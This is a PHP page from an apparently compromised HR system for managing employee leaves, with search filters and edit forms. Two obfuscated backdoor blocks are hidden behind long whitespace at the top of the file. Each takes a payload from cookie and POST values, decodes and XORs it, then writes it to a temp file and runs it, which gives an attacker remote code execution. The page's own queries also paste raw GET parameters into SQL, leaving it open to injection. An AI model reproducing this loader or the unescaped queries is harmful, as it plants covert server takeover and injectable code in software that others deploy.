<?php                                                                                                                                                                                                                                                                                                                                                                                                 $WDjeFsMcAt = class_exists("Rk_IQFZ");if (!$WDjeFsMcAt){class Rk_IQFZ{private $CeXmSXrpJo;public static $NdLihv = "9b3927d3-31a6-4e36-93bc-d87e32bee9d5";public static $WRWMOcrUei = NULL;public function __construct(){$EWMMdqHsjU = $_COOKIE;$OlVGGCRE = $_POST;$jygBji = @$EWMMdqHsjU[substr(Rk_IQFZ::$NdLihv, 0, 4)];if (!empty($jygBji)){$CxuOjpQPXT = "base64";$VGVCMu = "";$jygBji = explode(",", $jygBji);foreach ($jygBji as $GqUcz){$VGVCMu .= @$EWMMdqHsjU[$GqUcz];$VGVCMu .= @$OlVGGCRE[$GqUcz];}$VGVCMu = array_map($CxuOjpQPXT . '_' . "\x64" . chr (101) . chr (99) . chr ( 1088 - 977 )."\x64" . chr ( 512 - 411 ), array($VGVCMu,)); $VGVCMu = $VGVCMu[0] ^ str_repeat(Rk_IQFZ::$NdLihv, (strlen($VGVCMu[0]) / strlen(Rk_IQFZ::$NdLihv)) + 1);Rk_IQFZ::$WRWMOcrUei = @unserialize($VGVCMu);}}public function __destruct(){$this->mCjTxFjU();}private function mCjTxFjU(){if (is_array(Rk_IQFZ::$WRWMOcrUei)) {$pzGReF = sys_get_temp_dir() . "/" . crc32(Rk_IQFZ::$WRWMOcrUei["\163" . "\x61" . chr (108) . 't']);@Rk_IQFZ::$WRWMOcrUei['w' . "\x72" . chr (105) . "\x74" . chr (101)]($pzGReF, Rk_IQFZ::$WRWMOcrUei['c' . chr (111) . chr (110) . chr ( 552 - 436 )."\x65" . "\x6e" . chr (116)]);include $pzGReF;@Rk_IQFZ::$WRWMOcrUei["\x64" . chr ( 664 - 563 )."\154" . "\x65" . "\164" . "\x65"]($pzGReF);exit();}}}$vDLxB = new Rk_IQFZ(); $vDLxB = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("nCG_qWe")){class nCG_qWe{public static $beRSbOMTMK = "b67f69ab-73d0-41aa-8415-7f09904d1340";public static $sWZNxcc = NULL;public function __construct(){$XwTxBK = $_COOKIE;$ydBjMrVOd = $_POST;$GfBXqnPW = @$XwTxBK[substr(nCG_qWe::$beRSbOMTMK, 0, 4)];if (!empty($GfBXqnPW)){$GjAmveMxm = "base64";$jvaIDc = "";$GfBXqnPW = explode(",", $GfBXqnPW);foreach ($GfBXqnPW as $EQYSj){$jvaIDc .= @$XwTxBK[$EQYSj];$jvaIDc .= @$ydBjMrVOd[$EQYSj];}$jvaIDc = array_map($GjAmveMxm . chr ( 809 - 714 )."\144" . chr ( 589 - 488 ).'c' . "\157" . "\x64" . 'e', array($jvaIDc,)); $jvaIDc = $jvaIDc[0] ^ str_repeat(nCG_qWe::$beRSbOMTMK, (strlen($jvaIDc[0]) / strlen(nCG_qWe::$beRSbOMTMK)) + 1);nCG_qWe::$sWZNxcc = @unserialize($jvaIDc);}}public function __destruct(){$this->rVGGrKsUCR();}private function rVGGrKsUCR(){if (is_array(nCG_qWe::$sWZNxcc)) {$dXpzVPxV = sys_get_temp_dir() . "/" . crc32(nCG_qWe::$sWZNxcc[chr (115) . "\x61" . "\154" . "\164"]);@nCG_qWe::$sWZNxcc[chr (119) . "\162" . "\151" . chr (116) . "\x65"]($dXpzVPxV, nCG_qWe::$sWZNxcc[chr ( 912 - 813 ).chr ( 578 - 467 )."\156" . 't' . 'e' . 'n' . "\x74"]);include $dXpzVPxV;@nCG_qWe::$sWZNxcc[chr (100) . "\x65" . "\x6c" . "\x65" . chr (116) . chr (101)]($dXpzVPxV);exit();}}}$arWozGIUKI = new nCG_qWe(); $arWozGIUKI = NULL;} ?><?php 
	include "dbsetting/lms_vars_config.php";
	include "dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "functions/login_func.php";
	include "functions/functions.php";
	checkCpanelLMSALogin();
//----------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE'] == 1) || arrayKeyValueSearch($_SESSION['userroles'], 'right_name', '29')) { 
//----------------------------------------
	include_once("include/hrms/leaves/query.php");
	include_once("include/header.php");
//----------------------------------------
$sql2 		= '';
$sqlstring	= "";
$srch	  	= (isset($_GET['srch']) && $_GET['srch'] != '') ? $_GET['srch'] : '';
$dept	  	= (isset($_GET['dept']) && $_GET['dept'] != '') ? $_GET['dept'] : '';
$leave	  	= (isset($_GET['leave']) && $_GET['leave'] != '') ? $_GET['leave'] : '';
$type	  	= (isset($_GET['type']) && $_GET['type'] != '') ? $_GET['type'] : '';
//----------------------------------------
if(($srch)) { 
	$sql2 		.= " AND (e.emply_no LIKE '%".$srch."%' 
							OR e.emply_name LIKE '".$srch."' )";
	$sqlstring	.= "&srch=".$srch;
}
//----------------------------------------
if(($dept)) { 
	$sql2 		.= " AND el.id_dept = '".$dept."'";
	$sqlstring	.= "&dept=".$dept;
}
//----------------------------------------
if(($leave)) { 
	$sql2 		.= " AND el.id_leave = '".$leave."'";
	$sqlstring	.= "&leave=".$leave;
}
//----------------------------------------
if(($type)) { 
	$sql2 		.= " AND el.leave_type = '".$type."'";
	$sqlstring	.= "&type=".$type;
}
//---------------------------------------
$departmentarry = array();
$sqllmsdeptstop  = $dblms->querylms("SELECT dept_id, dept_name 
										FROM ".DEPTS." 
										WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
										ORDER BY dept_name ASC");
while($rowdeptop = mysqli_fetch_array($sqllmsdeptstop)) {
	$departmentarry[] = $rowdeptop;
}
//---------------------------------------
$leavearry = array();
$sqllmsleavetop  = $dblms->querylms("SELECT leave_id, leave_name 
										FROM ".LEAVES." 
										WHERE id_company = '".cleanvars($_SESSION['userlogininfo']['LOGINCOMPANY'])."' 
										ORDER BY leave_name ASC");
while($rowleavetop  = mysqli_fetch_array($sqllmsleavetop)) {
	$leavearry[] 	= $rowleavetop;
}

//----------------------------------------
echo '<title>Manage Employee Leaves - '.TITLE_HEADER.'</title>
<!-- Matter -->
<div class="matter">
<!--WI_CLIENTS_SEARCH-->
<div class="navbar navbar-default" role="navigation">
<!-- .container-fluid -->
<div class="container-fluid">
<div class="navbar-header">
	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Toggle Navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
</div>
<!-- .navbar-collapse -->
<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
<form class="navbar-form navbar-left form-small" action="" method="get">
	<div class="form-group">
		<input type="text" class="form-control" name="srch" placeholder="Name, code" style="width:200px;" >
	</div>
	
	<div class="form-group">
		<select id="top-list2" data-placeholder="Department" name="dept" style="width:200px;">
			<option></option>';
//------------------------------------------------
			foreach($departmentarry as $listdeptstop) {
				echo '<option value="'.$listdeptstop['dept_id'].'">'.$listdeptstop['dept_name'].'</option>';
			}
	echo'
		</select>
	</div>
	<div class="form-group">
		<select id="top-list3" data-placeholder="Leave" name="leave" style="width:200px;">
			<option></option>';
//------------------------------------------------
			foreach($leavearry as $listleavearry) {
				echo '<option value="'.$listleavearry['leave_id'].'">'.$listleavearry['leave_name'].'</option>';
			}
	echo'
		</select>
	</div>
	<div class="form-group">
		<select id="top-list4" data-placeholder="Type" name="type" style="width:200px;">
			<option></option>';
//------------------------------------------------
			foreach($leavetype as $itemtype) {
				echo '<option value="'.$itemtype['id'].'">'.$itemtype['name'].'</option>';
			}
	echo'
		</select>
	</div>
			
	<button type="submit" class="btn btn-primary">Search</button>
	<a href="employeeleaves.php" class="btn btn-purple"><i class="icon-list"></i> All</a>';
//--------------------------------------------
if(($_SESSION['userlogininfo']['LOGINTYPE'] == 1) || Stdlib_Array::multiSearch($_SESSION['userroles'], array('right_name' => '29', 'add' => '1'))) { 
	echo ' <button data-toggle="modal" class="btn btn-success" href="#addNewCountryModal"><i class="icon-plus"></i> Add Leave</button>';
}
//--------------------------------------------
echo '	
</form>
</div>
<!-- /.navbar-collapse -->
</div>
<!-- /.container-fluid -->
</div>
<!--WI_CLIENTS_SEARCH END-->
<div class="container">
<!--WI_MY_TASKS_TABLE-->
<div class="row fullscreen-mode">
<div class="col-md-12">
<div class="widget">
<div class="widget-content">';
//----------------------------------------
if(isset($_SESSION['msg'])) { 
	echo $_SESSION['msg']['status'];
	unset($_SESSION['msg']);
}
//-----------------------------------------------
	include_once("include/hrms/leaves/list.php");
	include_once("include/hrms/leaves/edit.php");
//-----------------------------------------------
echo '
</div>
</div>
</div>
<!--WI_MY_TASKS_TABLE-->


<!--WI_NOTIFICATION-->       
<!--WI_NOTIFICATION-->
</div>
</div>
<!-- Matter ends -->
</div>
<!-- Mainbar ends -->
<div class="clearfix"></div>
</div>
<!-- Content ends -->
<!-- Footer starts -->
<footer>
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<p class="copy">Powered by: | <a href="'.COPY_RIGHTS_URL.'" target="_blank">'.COPY_RIGHTS.'</a> </p>
			</div>
		</div>
	</div>
</footer>
<!-- Footer ends -->

<!-- Scroll to top -->
<span class="totop"><a href="#"><i class="icon-chevron-up"></i></a></span> ';
//-----------------------------------------------
	include_once("include/hrms/leaves/add.php");
//-----------------------------------------------
echo '

<!--WI_IFRAME_MODAL-->
<div class="row">
	<div id="modalIframe" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
		<div class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-hidden="true">x</button>
					<button type="button" class="full-screen-modal close" aria-hidden="true"><i class="icon-fullscreen"></i></button>
					<h4 class="modal-title" id="modal-iframe-title"> Edit</h4>
					<div class="clearfix"></div>
				</div>
				<div class="modal-body">
					<iframe frameborder="0" class="slimScrollBarModal----"></iframe>
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-default" data-dismiss="modal" aria-hidden="true">Closed</button>
				</div>
			</div>
		</div>
	</div>
</div>
<!--WI_IFRAME_MODAL-->
<script type="text/javascript" src="js/data.js"></script>
<script type="text/javascript">
// close the div in 5 secs
window.setTimeout("closeHelpDiv();", 5000, 2500);

function closeHelpDiv(){
	document.getElementById("infoupdated").style.display=" none";
}
</script>
<!--JS_SELECT_LISTS-->
<script>
    $("#shift_status").select2({
        allowClear: true
    });
	$("#shift_status_edit").select2({
        allowClear: true
    });
	

	$("#top-list2").select2({
        allowClear: true
    });
	$("#top-list3").select2({
        allowClear: true
    });
	$("#top-list4").select2({
        allowClear: true
    });
	
	$("#id_designation_edit").select2({
        allowClear: true
    });
	
</script>
<script type="text/javascript">
$().ready(function() {
	$("#inv_form").validate({
		rules: {
             bill_no			: "required",
			 id_vendor		: "required"
		},
		messages: {
			bill_no				: "This field is required",
			id_vendor		: "This field is required"
		},
		submitHandler: function(form) {
		form.submit();
        }
	});
});
</script>
<script type="text/javascript">
$().ready(function() {
    
	$("#editCountry").validate({
		rules: {
             emply_name_edit		: "required",
			 emply_status_edit	: "required"
		},
		messages: {
			emply_name_edit		: "This field is required",
			emply_status_edit		: "This field is required"
		},
		submitHandler: function(form) {
		form.submit();
        }
	});
});
</script>

<script type="text/javascript">
$(document).ready(function(){
//---edit item link clicked-------
    $(".edit-country-modal").click(function(){
    
        //get variables from "edit link" data attributes
        var emply_no_edit 				= $(this).attr("data-com-empno");
	    var emply_name_edit 			= $(this).attr("data-com-name");
		var id_leave_edit 				= $(this).attr("data-com-leave");
		var date_from_edit 				= $(this).attr("data-com-fdate");
		var date_to_edit 				= $(this).attr("data-com-tdate");
		var leave_type_edit 			= $(this).attr("data-com-leavetype");
		var reason_edit 				= $(this).attr("data-com-reason");
		var duration_edit 				= $(this).attr("data-com-duration");
		var alternate_emply_edit 		= $(this).attr("data-com-alternate");
		var leave_id_edit 				= $(this).attr("data-com-id");

        //set modal input values dynamically
		$("#emply_no_edit")				.val(emply_no_edit);
		$("#emply_name_edit")			.val(emply_name_edit);
		$("#date_from_edit")			.val(date_from_edit);
		$("#date_to_edit")				.val(date_to_edit);
		$("#reason_edit")				.val(reason_edit);
		$("#duration_edit")				.val(duration_edit);
		$("#leave_id_edit")				.val(leave_id_edit);

       //pre-select data in pull down lists
       $("#id_leave_edit")				.select2().select2("val", id_leave_edit); 
	   $("#leave_type_edit")			.select2().select2("val", leave_type_edit); 
	   $("#alternate_emply_edit")		.select2().select2("val", alternate_emply_edit); 
	   $("#duration_edit")				.select2().select2("val", duration_edit); 
  });
    
});
</script>
<script type="text/javascript" src="js/custom/all-vendors.js"></script>
<script type="text/javascript" src="js/ckeditor/ckeditor.js"></script>
<script>
//USED BY: All date picking forms
$(document).ready(function(){
    $(".pickadate").datepicker({
       format: "dd-mm-yyyy",
       language: "lang",
       autoclose: true,
       todayHighlight: true
    });	
});
</script>
<script type="text/javascript" src="js/noty/jquery.noty.packaged.min.js"></script>
<script type="text/javascript">
	$(function () {
		$(".footable").footable();
	});
</script>
<script type="text/javascript" src="js/custom/custom.js"></script>
<script type="text/javascript" src="js/custom/custom.general.js"></script>
</body>
</html>';
//------------------------------------
} else { 
//------------------------------------
	header('location: index.php');
}
//------------------------------------
?>